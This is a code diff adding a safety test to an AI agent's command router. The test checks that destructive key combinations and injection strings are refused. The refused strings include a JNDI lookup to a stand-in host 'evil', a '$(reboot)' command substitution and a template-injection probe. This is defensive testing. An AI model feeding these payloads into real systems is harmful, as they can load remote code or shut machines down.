@@ -2348,6 +2348,41 @@ def _response_validator():
 
 run_test("Response validator: DAN/hallucination/sys-leak + bypass (S31)", _response_validator)
 
+# S32 — terminator destructive + template-injection guards (GPT histogram surfaced these
+# as 'tone' but the real bug was wrong+destructive action firing).
+def _terminator_safety():
+    from core.router import route_single_intent as R
+    # destructive shortcuts must REFUSE (route to chat) not fire press_keys
+    for combo in ("press alt f4", "press ctrl w", "press ctrl q", "press ctrl shift t"):
+        r = R(combo) or {}
+        if r.get("tool") != "chat":
+            return f"destructive {combo!r} routed to {r.get('tool')} (should refuse)"
+        if "destructive" not in r.get("parameters", {}).get("task", "").lower():
+            return f"destructive {combo!r} refusal msg weak"
+    # benign shortcuts still fire
+    for combo in ("press ctrl c", "press enter", "press tab"):
+        r = R(combo) or {}
+        if r.get("tool") != "terminator" or r.get("action") != "press_keys":
+            return f"benign {combo!r} routed to {r.get('tool')}/{r.get('action')} (should fire)"
+    # type_text requires explicit target - chat questions must NOT fire it
+    for chat_q in ("write me a function that explains quantum physics",
+                   "write a poem about cats"):
+        r = R(chat_q)
+        if r and r.get("tool") == "terminator":
+            return f"chat question {chat_q!r} fired terminator"
+    # legit explicit type-into still works
+    r = R('type "hello" into chrome') or {}
+    if r.get("tool") != "terminator" or r.get("action") != "type_text":
+        return f"legit type-into-target failed: {r.get('tool')}/{r.get('action')}"
+    # SSTI markers refused
+    for inj in ("{{7*7}}", "${jndi:ldap://evil/x}", "$(reboot)"):
+        r = R(inj) or {}
+        if r.get("tool") != "chat":
+            return f"SSTI {inj!r} routed to {r.get('tool')} (should refuse)"
+    return True
+
+run_test("Router: terminator destructive + SSTI guards (S32 safety)", _terminator_safety)
+
 # Phase 36 — HackingTool fleet
 run_test("Router: 'ht search subdomain' → ht_search",     _route("ht search subdomain", "ultron", "ht_search"))
 run_test("Router: 'search hacking tools holehe' → ht_search", _route("search hacking tools holehe", "ultron", "ht_search"))
